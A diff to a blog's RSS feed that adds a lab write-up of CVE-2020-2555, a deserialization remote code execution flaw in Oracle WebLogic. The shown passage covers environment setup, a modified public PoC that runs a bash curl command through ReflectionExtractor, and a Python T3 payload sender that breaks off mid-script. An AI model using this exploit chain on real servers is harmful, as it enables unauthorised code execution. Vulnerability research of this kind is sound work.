@@ -6,8 +6,437 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 21 Mar 2026 12:12:36 +0800</lastBuildDate>
+        <lastBuildDate>Sat, 21 Mar 2026 10:10:36 +0800</lastBuildDate>
         <atom:link href="https://mathscantor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Oracle CVE-2020-2555 Analysis</title>
+            <link>https://mathscantor.github.io/posts/oracle-cve-2020-2555-analysis/</link>
+            <pubDate>Sat, 21 Mar 2026 10:10:36 +0800</pubDate>
+            
+            <guid>https://mathscantor.github.io/posts/oracle-cve-2020-2555-analysis/</guid>
+            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
+&lt;p&gt;Some vulnerabilities don’t look dangerous at first glance, and this one starts with an innocent-looking&lt;span style=&#34;font-family: Courier, monospace; font-weight: 600;&#34;&gt;&amp;ensp;toString()&amp;ensp;&lt;/span&gt;function.&lt;/p&gt;
+&lt;p&gt;In CVE-2020-2555, a seemingly harmless method call buried inside Java’s deserialization process becomes the entry point for remote code execution in Oracle WebLogic Server.&lt;/p&gt;
+&lt;p&gt;Rather than beginning with patch diffing or advisories, this write-up follows a different approach. We will instead start with a payload, trigger the bug, and follow the execution trail wherever it leads.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
+<p>Some vulnerabilities don’t look dangerous at first glance, and this one starts with an innocent-looking<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;toString()&ensp;</span>function.</p>
+<p>In CVE-2020-2555, a seemingly harmless method call buried inside Java’s deserialization process becomes the entry point for remote code execution in Oracle WebLogic Server.</p>
+<p>Rather than beginning with patch diffing or advisories, this write-up follows a different approach. We will instead start with a payload, trigger the bug, and follow the execution trail wherever it leads.</p>
+<h2 id="2-setup">2. Setup</h2>
+<p>To reproduce the issue, we’ll recreate a vulnerable environment:</p>
+<ul>
+<li>Oracle JDK 8u202</li>
+<li>WebLogic Server 12.2.1.4.0</li>
+<li>Coherence (bundled)</li>
+</ul>
+<h3 id="21-installing-oracle-jdk-8">2.1 Installing Oracle JDK 8</h3>
+<p>Before we can even think about triggering the vulnerability, we need to match a known vulnerable runtime environment. WebLogic is notoriously sensitive to Java versions, and CVE-2020-2555 is reliably reproducible on JDK 8u202.</p>
+<ol>
+<li>
+<p>Head over to Oracle’s <a href="https://www.oracle.com/asean/java/technologies/javase/javase8-archive-downloads.html">JDK 8 archive</a> and grab the exact version.
+<link href="/posts/css/alert.css" rel="stylesheet">
+<div class="alert note">
+    <div class="alert-content">
+        <div class="alert-header">
+            <span class="alert-icon"></span>
+            <strong class="alert-title">Note</strong>
+        </div>
+        <div class="alert-body">Newer JDK versions may introduce subtle behavioral differences (or even break the exploit chain entirely), so it’s important to stick to this version for reproducibility</div>
+    </div>
+</div>
+</p>
+</li>
+<li>
+<p>Once downloaded, extract the archive and place it in a standard JVM directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~/Downloads$ tar -zxvf jdk-8u202-linux-x64.tar.gz
+</span></span><span style="display:flex;"><span>wls@oracle-v12:~/Downloads$ sudo mkdir -p /usr/lib/jvm
+</span></span><span style="display:flex;"><span>wls@oracle-v12:~/Downloads$ sudo cp -r jdk1.8.0_202 /usr/lib/jvm/
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing JDK 8u202<br><br></span>
+</li>
+<li>
+<p>Finally, make sure your shell can find the correct Java binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~/Downloads$ echo <span style="color:#e6db74">&#34;export PATH=/usr/lib/jvm/jdk1.8.0_202/bin:</span>$PATH<span style="color:#e6db74">&#34;</span> &gt;&gt; ~/.bashrc
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Adding Java to PATH<br><br></span>
+</li>
+</ol>
+<p>At this point, we have a controlled Java environment. It is a small but critical step before we start poking at WebLogic’s internals.</p>
+<h3 id="22-installing-weblogic-server">2.2 Installing WebLogic Server</h3>
+<p>With Java in place, the next step is to set up a vulnerable WebLogic instance. For this analysis, we’ll use WebLogic Server 12.2.1.4.0, which includes the vulnerable Coherence components required for CVE-2020-2555.</p>
+<ol>
+<li>
+<p>Grab the installer for <a href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">Oracle WebLogic Server 12.2.1.4.0</a></p>
+</li>
+<li>
+<p>Unzip the installer and launch it using the JDK we configured earlier:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~/Downloads$ unzip fmw_12.2.1.4.0_wls_lite_Disk1_1of1.zip -d wls-install <span style="color:#f92672">&amp;&amp;</span> cd wls-install
+</span></span><span style="display:flex;"><span>wls@oracle-v12:~/Downloads/wls-install$ java -jar fmw_12.2.1.4.0_wls_lite_generic.jar 
+</span></span></code></pre></div></li>
+<li>
+<p>The installer is mostly straightforward, and you can leave most options as default. However, a few selections are important to ensure a clean and reproducible lab setup:</p>
+<ul>
+<li>
+<p>Skip Auto Updates (we don’t want external interference in our test environment)</p>
+<p><img class="center" alt="wls-installation-setup-step-2" src="/posts/oracle-cve-2020-2555-analysis/images/wls-installation-setup-step-2.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Auto Updates Option: Skip Auto Updates</span><br><br></span></p>
+</li>
+<li>
+<p>Installation Type: WebLogic Server</p>
+<p><img class="center" alt="wls-installation-setup-step-4" src="/posts/oracle-cve-2020-2555-analysis/images/wls-installation-setup-step-4.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Choose Installation Type: WebLogic Server</span><br><br></span></p>
+</li>
+<li>
+<p>Development Mode with JDK 8 (ensures relaxed security defaults and compatibility)</p>
+<p><img class="center" alt="wls-installation-config-step-4" src="/posts/oracle-cve-2020-2555-analysis/images/wls-installation-config-step-4.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Development Mode with JDK 8</span><br><br></span></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Once installation completes, start the default domain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~$ ~/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/startWebLogic.sh
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Starting the WebLogic Server<br><br></span>
+</li>
+</ol>
+<h3 id="23-setting-up-debug-environment">2.3 Setting Up Debug Environment</h3>
+<p>So far, we’ve just built ourselves a gloriously vulnerable system. Patience, my friends, this isn’t a Macdonalds drive-thru.</p>
+<p><img class="center" alt="impatient" src="/posts/oracle-cve-2020-2555-analysis/images/impatient.gif"><br></p>
+<p>Now, we want visibility. To do that, we’ll attach a debugger to the JVM running WebLogic.</p>
+<h4 id="231-server-side-debug-parameters">2.3.1 Server-Side Debug Parameters</h4>
+<p>To observe execution in real time, we’ll enable JDWP in the startup script. One small detail to keep in mind: Java 8 uses the older debug syntax. So instead of <code>address=*:&lt;port&gt;</code> (Java 9+), it expects just <code>address=&lt;port&gt;</code>.</p>
+<ol>
+<li>
+<p>Edit the WebLogic startup script with your favourite editor (I&rsquo;m a vim enjoyer):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~$ vim ~/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/startWebLogic.sh
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Editing Startup Script<br><br></span>
+</li>
+<li>
+<p>Locate the section where <code>LAUNCH_ARGS</code> is defined and change it to the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">183</span>     <span style="color:#75715e"># START WEBLOGIC</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">184</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">185</span>     <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>USE_JVM_SYSTEM_LOADER<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#f92672">]</span> ; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">186</span>         LAUNCH_ARGS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -cp </span><span style="color:#e6db74">${</span>WL_HOME<span style="color:#e6db74">}</span><span style="color:#e6db74">/server/lib/weblogic-launcher.jar -Dlaunch.use.env.classpath=true&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Adding JDWP in Launch Arguments<br><br></span>
+</li>
+</ol>
+<h4 id="232-vs-code-configurations">2.3.2 VS Code Configurations</h4>
+<p>The vulnerability we’re targeting resides in Coherence, so we’ll need to decompile its JAR. It’s important that the decompilation preserves line numbers, since Java debugging relies on the source being as close to a 1-to-1 match as possible.</p>
+<p>I experimented with a few decompilers like <a href="https://github.com/leibnitz27/cfr">CFR</a> and <a href="https://github.com/intoolswetrust/jd-cli">JD-CLI</a>, but the one that consistently produced usable output was still <a href="https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.jar">JD-GUI</a>. So&hellip;that’s what we’ll go with.</p>
+<ol>
+<li>
+<p>Decompile coherence.jar using JD-GUI</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~/Downloads$ java -jar jd-gui-1.6.6.jar
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Running JD-GUI</span><br><br></span>
+<p><img class="center" alt="jd-gui-1" src="/posts/oracle-cve-2020-2555-analysis/images/jd-gui-1.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Opening coherence.jar in JD-GUI</span><br><br></span></p>
+</li>
+<li>
+<p>File &gt; Save all sources &gt; Save location: /home/wls/coherence.jar.src.zip</p>
+<p><img class="center" alt="jd-gui-2" src="/posts/oracle-cve-2020-2555-analysis/images/jd-gui-2.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Opening coherence.jar in JD-GUI</span><br><br></span></p>
+</li>
+<li>
+<p>Unzip the exported archive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~$ unzip coherence.jar.src.zip -d coherence-src
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Uncompressing Coherence Source Code</span><br><br></span>
+</li>
+<li>
+<p>Open coherence-src folder in vscode and install the &lsquo;Debugger for Java&rsquo; extension by Microsoft. Then, create .vscode/launch.json within the same workspace to look something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;0.2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;configurations&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;java&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Debug (Attach) Remote Java App&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;request&#34;</span>: <span style="color:#e6db74">&#34;attach&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;hostName&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;port&#34;</span>: <span style="color:#ae81ff">5005</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Create Debugger Settings in VS Code</span><br><br></span>
+</li>
+</ol>
+<h2 id="3-payload-generation">3. Payload Generation</h2>
+<p>We’ve done all this prep work, and I know you’re itching to dive into the vulnerability, but unfortunately, this isn’t magic. No payload, no game.</p>
+<Insert meme description here to humour audience>
+<img class="center" alt="are-we-there-yet" src="/posts/oracle-cve-2020-2555-analysis/images/are-we-there-yet.gif"><br>
+<p>The next step is to generate a working payload. There are plenty of public PoCs for this vulnerability, but rather than building everything from scratch, we’ll start with one that already works and adapt it to our needs.</p>
+<ol>
+<li>
+<p>We’ll use a PoC by <a href="https://gitee.com/chenjiew">chenwjiew</a>, which requires minimal modifications.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~$ git clone https://gitee.com/chenjiew/CVE-2020-2555.git
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Git Clone Template Exploit</span><br><br></span>
+</li>
+<li>
+<p>Replace the bundled <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;coherence.jar&ensp;</span> with the exact version used by our WebLogic instance
+<link href="/posts/css/alert.css" rel="stylesheet">
+<div class="alert note">
+    <div class="alert-content">
+        <div class="alert-header">
+            <span class="alert-icon"></span>
+            <strong class="alert-title">Note</strong>
+        </div>
+        <div class="alert-body"><p>This step is more important than it looks:</p>
+<ul>
+<li>Gadget chains are often version-sensitive</li>
+<li>A mismatch in class structure can break deserialization or shift execution paths</li>
+<li>Using the exact JAR ensures our payload behaves identically to the target runtime</li>
+</ul></div>
+    </div>
+</div>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~$ cd CVE-2020-2555
+</span></span><span style="display:flex;"><span>wls@oracle-v12:~/CVE-2020-2555$ cp ~/Oracle/Middleware/Oracle_Home/coherence/lib/coherence.jar ./lib/coherence.jar
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Replacing Coherence Library</span><br><br></span>
+</li>
+<li>
+<p>At the core of this exploit is <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ReflectionExtractor&ensp;</span> which allows us to invoke arbitrary methods via reflection. We’ll modify its parameters in <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;src/com/superam/CVE-2020-2555.java&ensp;</span> to control what gets executed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ReflectionExtractor extractor3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ReflectionExtractor(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;exec&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;curl http://127.0.0.1:8080/test&#34;</span>}}
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Simple Curl Test Payload</span><br><br></span>
+</li>
+<li>
+<p>By default, the PoC sends the payload directly to the target. For our purposes, that’s not ideal. We want more control and flexibility, especially since we’ll be iterating on the payload during debugging. So instead of sending it immediately, we’ll modify the code to serialize the payload into a file.</p>
+<ul>
+<li>Near the end of the <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;main()&ensp;</span> function in <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;src/com/supeream/CVE_2020_2555.java&ensp;</span>, comment out the network send logic and keep only serialization:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CVE_2020_2555</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ...
+</span></span><span style="display:flex;"><span>        BadAttributeValueExpException badAttributeValueExpException <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BadAttributeValueExpException(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> badAttributeValueExpException.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;val&#34;</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(badAttributeValueExpException, limitFilter);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// serialize</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// byte[] payload = Serializables.serialize(badAttributeValueExpException);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// T3 send, you can also use python script. weblogic_t3.py</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// T3ProtocolOperation.send(&#34;172.16.1.130&#34;, &#34;7001&#34;, payload);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// test</span>
+</span></span><span style="display:flex;"><span>        serialize(badAttributeValueExpException);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// deserialize();</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Modifying <span style="font-family: Courier, monospace; font-weight: 600;"> src/com/supeream/CVE_2020_2555.java </span></span><br><br></span>
+</li>
+<li>
+<p>With the changes in place, compile the project:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~/CVE-2020-2555$ mkdir -p target/classes <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>javac -d target/classes -cp <span style="color:#e6db74">&#34;lib/*&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>src/com/supeream/payload/*.java <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>src/com/supeream/serial/*.java <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>src/com/supeream/ssl/*.java <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>src/com/supeream/weblogic/*.java <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>src/com/supeream/*.java
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Compiling The Payload Generator</span><br><br></span>
+</li>
+<li>
+<p>Run the generator. If everything is set up correctly, this produces a serialized payload (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;test.ser&ensp;</span>), which contains our crafted object graph.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~/CVE-2020-2555$ java -cp <span style="color:#e6db74">&#34;target/classes:lib/*&#34;</span> com.supeream.CVE_2020_2555
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Running The Payload Generator</span><br><br></span>
+</li>
+<li>
+<p>Instead of relying on the original Java sender, we’ll use a Python script to deliver the payload over WebLogic’s T3 protocol.Replace <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;weblogic_t3.py&ensp;</span> with the following Python 3-compatible version:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Usage: python </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &lt;host&gt; &lt;port&gt; &lt;/path/to/payload&gt;&#39;</span> <span style="color:#f92672">%</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>basename(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>]))
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server_address <span style="color:#f92672">=</span> (sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] Connecting to </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> port </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> server_address)
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>connect(server_address)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send headers</span>
+</span></span><span style="display:flex;"><span>headers<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;t3 12.2.1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">AS:255</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">HL:19</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">MS:10000000</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">PU:t3://us-l-breens:7001</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;sending &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">%</span> headers)
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>sendall(headers)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>print(sys<span style="color:#f92672">.</span>stderr, <span style="color:#e6db74">&#39;received &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">%</span> data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payloadObj <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>],<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">+</span>payloadObj
